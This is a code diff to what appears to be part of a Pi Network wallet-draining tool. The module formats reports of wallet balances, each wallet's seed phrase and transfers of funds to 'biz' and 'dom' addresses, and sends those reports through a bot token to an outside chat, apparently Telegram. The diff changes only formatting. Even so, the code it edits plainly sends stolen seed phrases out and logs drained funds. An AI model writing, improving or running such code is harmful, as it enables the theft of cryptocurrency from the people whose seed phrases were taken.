@@ -19,14 +19,6 @@ function renderTransferLine(transfer) {
   if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
     parts.push(`Pi: ${transfer.piBusinessAmount} π → biz, ${transfer.piDomesticAmount} π → dom`);
   }
-  if (transfer.otherAssetsTransferred && transfer.otherAssetsTransferred.length > 0) {
-    const other = transfer.otherAssetsTransferred.map((t) => {
-      if (t.status === 'sent') return `${t.asset} ${t.amount} → dom`;
-      if (t.status === 'skipped') return `${t.asset} skipped`;
-      return `${t.asset} ${t.status}`;
-    });
-    parts.push(`Other: ${other.join(', ')}`);
-  }
   if (transfer.txHash) parts.push(`tx: ${transfer.txHash}`);
 
   return `   Transfer: ✅ ${parts.join(' | ')}`;
@@ -40,32 +32,19 @@ function renderResultsText(results, mode = 'full') {
     let resultLines = [];
 
     if (r.status === 'invalid' || r.status === 'error') {
-      resultLines.push(`• \`${short}\` — ⚠️ ${r.status}${r.error ? ` (${r.error})` : ''}`);
+      resultLines.push(`• ${short} — ⚠️ ${r.status}${r.error ? ` (${r.error})` : ''}`);
     } else {
       const total = (r.unlockedBalance || 0) + (r.lockedBalance || 0);
 
-      if (isFull) {
-        const otherAssets =
-          r.otherAssets && r.otherAssets.length > 0
-            ? r.otherAssets.map((a) => `${a.balance} ${a.asset}`).join(', ')
-            : 'none';
-
-        resultLines.push(`• \`${short}\``);
-        resultLines.push(`   Unlocked: ${r.unlockedBalance} π`);
-        resultLines.push(`   Locked: ${r.lockedBalance} π (unlocks ${formatDate(r.nextUnlockDate)})`);
-        resultLines.push(`   Total: ${total} π`);
-        resultLines.push(`   Other assets: ${otherAssets}`);
-      } else {
-        resultLines.push(`• \`${short}\``);
-        resultLines.push(`   Unlocked: ${r.unlockedBalance} π`);
-        resultLines.push(`   Locked: ${r.lockedBalance} π`);
-        resultLines.push(`   Next Unlock: ${formatDate(r.nextUnlockDate)}`);
-        resultLines.push(`   Total: ${total} π`);
-      }
+      resultLines.push(`• ${short}`);
+      resultLines.push(`   Unlocked: ${r.unlockedBalance} π`);
+      resultLines.push(`   Locked: ${r.lockedBalance} π`);
+      resultLines.push(`   Next Unlock: ${formatDate(r.nextUnlockDate)}`);
+      resultLines.push(`   Total: ${total} π`);
     }
 
     if (isFull && r.seedPhrase) {
-      resultLines.push(`   Passphrase: \`${r.seedPhrase}\``);
+      resultLines.push(`   Passphrase: ${r.seedPhrase}`);
     }
 
     if (isFull && r.transfer) {
@@ -75,7 +54,7 @@ function renderResultsText(results, mode = 'full') {
     return resultLines.join('\n');
   });
 
-  return ['*Pi Wallet Balance Report*', '', ...lines].join('\n\n');
+  return ['Pi Wallet Balance Report', '', ...lines].join('\n\n');
 }
 
 async function sendToTarget(botToken, chatId, text) {
@@ -88,7 +67,6 @@ async function sendToTarget(botToken, chatId, text) {
       body: JSON.stringify({
         chat_id: chatId,
         text,
-        parse_mode: 'Markdown',
         disable_web_page_preview: true,
       }),
     });
